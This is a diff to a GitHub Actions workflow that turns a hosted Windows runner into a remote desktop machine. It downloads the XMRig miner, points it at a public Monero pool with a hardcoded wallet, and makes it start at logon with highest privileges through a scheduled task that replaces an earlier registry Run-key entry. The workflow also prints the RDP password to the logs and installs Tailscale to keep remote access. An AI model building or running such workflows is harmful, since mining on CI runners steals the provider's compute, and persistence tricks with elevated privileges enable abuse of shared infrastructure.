@@ -1,4 +1,4 @@
-name: RDP TEST with Auto-Start Miner (Final Corrected Version)
+name: RDP TEST with Admin Auto-Start Miner (MSR Enabled)
 
 on:
   workflow_dispatch:
@@ -25,52 +25,45 @@ jobs:
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
           echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
 
-      - name: Install, Configure, and Set Auto-Start
+      - name: Install and Configure XMRig Miner
         shell: powershell
         run: |
-          # --- This script is now one single, robust block ---
-          $ErrorActionPreference = "Stop" # Fail on any error
-          
-          # --- 1. Setup Paths and Variables ---
+          $ErrorActionPreference = "Stop"
           $minerVersion = "6.21.2"
           $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
           $zipPath = "$env:TEMP\xmrig.zip"
           $desktopPath = "C:\Users\RDP\Desktop"
           
-          Write-Host "Ensuring Desktop directory exists..."
           New-Item -ItemType Directory -Force -Path $desktopPath
-          
-          # --- 2. Download and Extract ---
-          Write-Host "Downloading XMRig v$($minerVersion)..."
           Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
-          
-          Write-Host "Extracting XMRig to Desktop..."
           Expand-Archive -Path $zipPath -DestinationPath $desktopPath -Force
           
           $minerFolder = (Get-ChildItem -Path $desktopPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
           if (-not $minerFolder) { throw "CRITICAL: Could not find extracted XMRig folder!" }
-          Write-Host "Found miner folder: $minerFolder"
-
-          # --- 3. Verify Miner Exists ---
-          $exePath = Join-Path $minerFolder "xmrig.exe"
-          if (-not (Test-Path $exePath)) { throw "CRITICAL: xmrig.exe not found after extraction!" }
-          Write-Host "SUCCESS: xmrig.exe verified at $exePath"
           
-          # --- 4. Create Config Files ---
           $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
           $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
-          Write-Host "config.json created."
 
+          # The .bat file no longer needs a pause and will run silently in the background
           $batPath = Join-Path $desktopPath "Start-Miner.bat"
           $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe"
           Set-Content -Path $batPath -Value $batContent
-          Write-Host "Start-Miner.bat created."
 
-          # --- 5. Set Auto-start via Registry ---
-          $runKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-          Write-Host "Adding miner to registry for auto-start..."
-          Set-ItemProperty -Path $runKey -Name "XMRigMiner" -Value $batPath -Force
-          Write-Host "SUCCESS: Registry auto-start entry created."
+      - name: Auto-start Miner with Admin Privileges (Task Scheduler)
+        shell: powershell
+        run: |
+          $ErrorActionPreference = "Stop"
+          $taskName = "XMRigMinerAutoStart"
+          $batPath = "C:\Users\RDP\Desktop\Start-Miner.bat"
+          
+          Write-Host "Creating a new Scheduled Task to run the miner with Admin privileges..."
+          # This command creates a task that runs the .bat file on logon with the highest privileges.
+          schtasks /create /TN $taskName /TR $batPath /SC ONLOGON /RL HIGHEST /F
+          
+          Write-Host "--- Verification Step ---"
+          Write-Host "Querying task to confirm its creation:"
+          schtasks /query /TN $taskName
+          Write-Host "SUCCESS: Task Scheduler entry created. MSR should now be enabled on login."
 
       - name: Install Tailscale
         shell: powershell
@@ -97,7 +90,8 @@ jobs:
           Write-Host "Username: RDP"
           Write-Host "Password: ${{ env.RDP_PASSWORD }}"
           Write-Host "----------------------------------------------------------------"
-          Write-Host "ACTION: The miner will now start AUTOMATICALLY when you log in."
+          Write-Host "ACTION: The miner will now start automatically WITH ADMIN RIGHTS."
+          Write-Host "You should see a higher hashrate with MSR enabled."
           Write-Host "================================================================"
 
       - name: Maintain Connection
